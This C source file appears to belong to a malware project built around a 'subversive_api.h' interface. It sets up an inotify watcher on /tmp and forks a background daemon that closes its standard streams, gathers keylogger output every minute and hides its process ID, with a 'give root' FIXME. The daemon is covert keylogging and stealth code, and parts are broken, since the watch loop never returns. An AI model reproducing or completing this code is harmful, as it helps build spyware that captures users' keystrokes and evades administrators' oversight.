#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "subversive_api.h"
#include <errno.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/inotify.h>
#include <unistd.h>

/* Read all available inotify events from the file descriptor 'fd'.
  wd is the table of watch descriptors for the directories in argv.
  argc is the length of wd and argv.
  argv is the list of watched directories.
  Entry 0 of wd and argv is unused. */

struct watch_dir_struct {
	int fd;
	int *wds, wds_curr_idx;
	size_t wds_size;
};

static struct watch_dir_struct *watch_dir_init(void)
{
	struct watch_dir_struct *w;

	w = malloc(sizeof(*w));
	if (!w)
		return NULL;

	w->wds_curr_idx = 0;
	w->wds_size = 1024;

	w->fd = inotify_init1(IN_NONBLOCK);
	if (w->fd == -1) {
		perror("inotify_init1");
		free(w);
		return NULL;
	}

	/* Allocate memory for watch descriptors */

	w->wds = calloc(w->wds_size, sizeof(int));
	if (!w->wds) {
		perror("calloc");
		close(w->fd);
		free(w);
		return NULL;
	}

	return w;
}

int watch_dir_add_path(struct watch_dir_struct *w, const char *path)
{
	int idx = w->wds_curr_idx;

	if (idx >= w->wds_size)
		return -1;

	w->wds[idx] = inotify_add_watch(w->fd, path, IN_CREATE);
	if (w->wds[idx] == -1) {
		perror("inotify_add_watch");
		return -1;
	}

	w->wds_curr_idx++;

	return 0;
}

int watch_dir_loop(struct watch_dir_struct *w)
{
	int poll_num;
	nfds_t nfds;
	struct pollfd fds[1];

	/* Prepare for polling */
	nfds = 1;

	/* Inotify input */
	fds[0].fd = w->fd;
	fds[0].events = POLLIN;

	/* Wait for events and/or terminal input */

	printf("Listening for events.\n");
	while (1) {
		poll_num = poll(fds, nfds, -1);
		if (poll_num == -1) {
			if (errno == EINTR)
				continue;
			perror("poll");
			exit(EXIT_FAILURE);
		}

		if (poll_num > 0) {
			if (fds[0].revents & POLLIN) {
			/* Inotify events are available */
				printf("Handle events\n");
			}
		}
	}

	printf("Listening for events stopped.\n");

	/* Close inotify file descriptor */

	close(w->fd);

	free(w->wds);
	exit(EXIT_SUCCESS);
}

void __subversive_daemon(const char *keylogger_file)
{
	while (1) {
		sleep(60);
		get_keylogger_buf(keylogger_file);
	}
}

void subversive_daemon(const char *keylogger_file)
{
	pid_t pid;

	printf("Daemon\n");

	pid = fork();
	if (pid < 0)
		return;

	if (pid) {
		/* FIXME: give root */
		struct watch_dir_struct *w = watch_dir_init();
		if (w) {
			watch_dir_add_path(w, "/tmp/");
			watch_dir_loop(w);
		}
		hide_pid(pid);
		exit(0);
	} else {
		close(0);
		close(1);
		close(2);
		__subversive_daemon(keylogger_file);
	}
}
